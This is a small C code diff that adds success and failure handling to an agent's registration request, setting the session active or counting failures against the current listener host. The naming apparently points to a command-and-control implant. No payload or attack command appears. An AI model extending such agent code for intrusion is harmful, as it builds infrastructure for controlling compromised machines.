@@ -185,7 +185,12 @@ INT RegisterAgent(pAgent agent) {
 
 BOOL SendRegisterRequest(pAgent agent, VOID* Buffer, ULONG BufferLength) {
 
-    PerformRequest(agent, Buffer, BufferLength);
-
-    return 1;
+    if ((PerformRequest(agent, Buffer, BufferLength)) == 0) {
+        agent->session->Active = TRUE;
+        return TRUE;
+    }
+    else {
+        agent->config->listenerConfig.CurrentHost->NumFailures++;
+        return FALSE;
+    }
 }
